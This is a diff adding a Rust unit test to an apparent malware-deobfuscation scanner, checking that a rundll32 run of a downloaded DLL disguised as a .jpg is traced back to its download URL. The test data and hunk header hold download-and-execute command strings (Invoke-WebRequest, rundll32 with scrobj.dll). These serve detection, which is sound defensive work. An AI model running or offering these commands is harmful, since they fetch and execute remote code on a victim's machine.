@@ -14010,6 +14010,29 @@ rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/pay
     }
 
     #[test]
+    fn spaced_rundll32_downloaded_dll_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "Invoke-WebRequest -OutFile C:\\programdata\\putty.jpg".to_string(),
+            src: "https://spaced-rundll32.example/putty.jpg".to_string(),
+            dst: Some("C:\\programdata\\putty.jpg".to_string()),
+        });
+        crate::deob_scan::scan_deob_text("rundll32 C:\\programdata\\putty.jpg,Wind", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { cmd, url: Some(url) }
+                        if cmd == "rundll32 C:\\programdata\\putty.jpg,Wind"
+                            && url == "https://spaced-rundll32.example/putty.jpg"
+                )
+            }),
+            "spaced rundll32 downloaded DLL was not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn glued_rundll32_scanner_ignores_non_execution_mentions() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
